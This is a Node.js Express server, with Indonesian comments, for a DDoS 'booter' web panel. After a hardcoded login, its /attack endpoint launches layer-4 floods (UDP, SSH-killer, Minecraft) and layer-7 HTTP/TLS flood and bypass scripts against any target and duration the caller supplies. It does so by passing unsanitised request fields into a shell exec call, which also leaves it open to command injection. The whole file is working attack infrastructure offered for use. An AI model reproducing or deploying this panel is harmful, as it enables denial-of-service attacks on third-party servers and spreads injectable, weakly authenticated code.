const express = require('express');
const bodyParser = require('body-parser');
const exec = require('child_process').exec;
const path = require('path');

const app = express();
const port = 3000;

// Hanya user ini yang boleh login
const USERNAME = 'rizz';
const PASSWORD = '1';

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(__dirname)); // Serve file statis

// Halaman utama
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Proses login
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === USERNAME && password === PASSWORD) {
    res.json({ success: true });
  } else {
    res.json({ success: false, message: 'Invalid credentials' });
  }
});

// Endpoint serangan
app.post('/attack', (req, res) => {
  const { layer, target, method, time } = req.body;

  if (!target || !method || !time) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  let command;

  if (layer === 'layer4') {
    if (method === 'UDP') {
      command = `node ${__dirname}/cache/udp ${target} 22 proxy ${time}`;
    } else if (method === 'KillSSH') {
      command = `node ${__dirname}/cache/sshkiller ${target} 22 root ${time}`;
    } else if (method === 'Minecraft') {
      command = `node ${__dirname}/cache/StarsXMc ${target} 22 proxy ${time}`;
    } else {
      return res.status(400).json({ error: 'Invalid Layer 4 method' });
    }
  } else if (layer === 'layer7') {
    const layer7Methods = [
      'flood', 'floodapi', 'floodvip', 'floodv2',
      'tls', 'strike', 'hold', 'kill', 'h2-bypass',
      'storm', 'h2-flood', 'destroy', 'bypass', 'raw',
      'thunder', 'ninja', 'glory'
    ];

    if (!layer7Methods.includes(method)) {
      return res.status(400).json({ error: 'Invalid Layer 7 method' });
    }

    command = `node ${__dirname}/cache/${method}.js ${target} ${time}`;
  } else {
    return res.status(400).json({ error: 'Invalid layer' });
  }

  exec(command, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: `Execution error: ${stderr}` });
    }
    res.json({ status: 'Attack started', command, output: stdout });
  });
});

// Jalankan server
app.listen(port, () => {
  console.log(`Server berjalan di http://localhost:${port}`);
});